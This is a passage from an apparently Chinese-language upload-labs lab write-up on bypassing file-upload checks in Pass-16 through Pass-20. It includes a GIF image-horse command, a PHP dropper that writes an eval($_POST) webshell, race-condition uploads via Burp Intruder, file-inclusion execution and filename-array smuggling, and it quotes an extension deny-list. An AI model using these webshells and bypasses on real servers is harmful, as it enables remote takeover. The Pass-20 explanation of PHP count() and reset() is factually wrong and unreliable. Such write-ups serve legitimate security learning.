    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagegif($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

在进行绕过的时候其实不同类型的文件难度是不一样的，最简单的是`.gif`，所以这里用`.gif`进行解题。思路就是先制作一个`.gif`的图片马，上传后将二次渲染的图片下载下来，将二者进行比对，没有被打散的地方插入一句话木马再上传。

由于edjpgcom.exe只能制作`.jpg`图片马，这里选择用质朴的命令行来进行制作。

首先准备一个一句话木马`test.php`和一个`.gif`文件`test.gif`，在命令行窗口执行以下指令：

```bash
copy test.gif/b + test.php/a test1.gif
```

将生成的图片马进行上传，右键另存为进行下载：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758007601388-29304061-a37c-4ed9-ba9a-67db163d9b3b.png)

将这个下载的`.gif`文件与上传的`.gif`图片马进行比对，这里用的是010 Editor自带的比对功能：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758008003249-509a1fd7-b49c-4cc5-b77c-8994021d395c.png)

可以看到下载的`.gif`最后并没有我们写的一句话木马。其实Match的地方还是有不少，可以在这些地方插入我们的一句话木马。如图，找到一段足够长的Match的地方，替换一段为我们的一句话木马：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758012392426-e5a15a92-e39b-4252-9bce-03c1d4b54fc0.png)

另存为`test2.gif`后上传：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758012447955-c5d1ef57-71a5-4a25-a409-41904bcb789f.png)

尝试利用文件包含漏洞对其进行解析：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758012490467-7600b673-8a6d-49b1-852b-9a88ca96dbbc.png)

> 其实这里试了好几次都失败了，报500 Internal Server Error的错误，一度以为是权限或者`include`的路径被限制等问题，但是最后是通过换不同位置修改成功的，暂时还没搞懂是什么原因。
>

# Pass-17
查看这题源码，发现有段关键逻辑是尝试将文件从临时目录移动到目标目录，如果文件类型合法，文件会被重命名并移动到指定的目标目录；如果文件类型不合法，原文件会被删除，并返回错误信息 。看起来符合条件竞争上传绕过。

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
  $ext_arr = array('jpg','png','gif');
  $file_name = $_FILES['upload_file']['name'];
  $temp_file = $_FILES['upload_file']['tmp_name'];
  $file_ext = substr($file_name,strrpos($file_name,".")+1);
  $upload_file = UPLOAD_PATH . '/' . $file_name;

  if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
      $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
      rename($upload_file, $img_path);
      $is_upload = true;
    }else{
      $msg = "只允许上传.jpg|.png|.gif类型文件！";
      unlink($upload_file);
    }
  }else{
    $msg = '上传出错！';
  }
}
```

条件竞争上传绕过核心就是通过多线程发包导致并发，<font style="color:rgb(51, 51, 51);">导致服务器处理数据变慢，因此在文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），可以利用这个时间差完成竞争条件的上传漏洞攻击。</font>

<font style="color:rgb(51, 51, 51);">先准备一个</font>`<font style="color:rgb(51, 51, 51);">test.php</font>`<font style="color:rgb(51, 51, 51);">，内容为生成一个新的webshell脚本</font>`<font style="color:rgb(51, 51, 51);">1.php</font>`<font style="color:rgb(51, 51, 51);">：</font>

```php
<?php fputs(fopen("1.php", "w"),'<?php @eval($_POST["HackYou"]); ?>'); ?>
```

理一下思路：

+ 先上传`test.php`，抓包
+ 上传一个符合要求的图片类型，查看图片上传路径
+ 访问`test.php`的URL（当然是没有的，毕竟还没传），抓包

根据上一步获取的图片上传路径，猜测访问`test.php`的URL是`http://192.168.159.128:8000/upload/test.php`

+ 将上传包和访问包发送到Intruder，开始构造竞争关系

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758024636612-a9dd6f62-a2c4-41f6-b165-3095f22aa831.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758024839260-01f275e7-b0b3-4cdb-bfa3-a2e179ff85f1.png)

+ 连接`http://192.168.159.128:8000/upload/1.php`，getshell成功

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758025003257-407d05d6-b14c-47fc-8dc0-2919c37d2c77.png)

> 这里由于一直不能成功，改了源码，加了延时，让复现的难度变低：
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758025535484-e6f9ad00-beb3-464f-b429-4e04d08b4262.png)
>

# Pass-18
这题与上题区别不是很大，只是这题加上了白名单限制，不能直接上传`.php`文件，而是上传一个图片马，然后用文件包含漏洞来调用，这两个过程形成条件竞争。

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};

```

首先上传之前用到过的图片马后抓包。然后访问文件包含漏洞的URL`http://192.168.159.128:8000/include.php?file=upload/test2.gif`后抓包。将两个包发到Intruder，照上一题配置后进行攻击即可。

# Pass-19
查看本题源码，是没有文件包含漏洞的，要上传webshell，但是通过黑名单做了比较完善的校验。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

不过百密一疏，源码没有对扩展名的绕过方式做过多校验，可以参考Pass-06到Pass-09的解题方式，不过由于靶场部署在Linux，这些特性无法用上。

# Pass-20
 这题一直没找到明显的漏洞，回归代码进行分析。

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

本题有两段校验，第一段是简单的MIME校验，可以通过修改Content-Type解决；第二段则是<font style="color:rgb(77, 77, 77);">将文件名按照</font>`<font style="color:rgb(77, 77, 77);">.</font>`<font style="color:rgb(77, 77, 77);">分割产生一个数组，将数组中第一个元素和最后一个元素提取出来，中间加</font>`<font style="color:rgb(77, 77, 77);">.</font>`<font style="color:rgb(77, 77, 77);">，拼接后形成新的文件名。</font>

<font style="color:rgb(77, 77, 77);">上传一个shell抓包看看：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758076774719-72a439ed-7c5a-4980-9240-a8cd5a494521.png)

首先要修改Content-Type为`image/jpeg`，然后不依赖本身的数组划分机制，构造数组如下：

```php
$file[0] = "shell"
$file[1] = ""      // 空
$file[2] = "php"
$file[3] = "jpg"
```

这样的话，由于`count()`函数有一个特性，即如果数组中存在空的项，那么在计算数组个数的时候，就不会把空的项计算在内，所以：

+ `reset($file)` → `"exp"`
+ `count($file)` → `3`
+ `$file[count($file)-1]` → `$file[2]` → `"php"`

所以payload如下：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758077501878-789483d7-84fd-4c2e-b1bc-45978a06746b.png)

上传后getshell成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758077536148-c1981c60-70e9-4ea9-af6d-3e98ed0790f1.png)

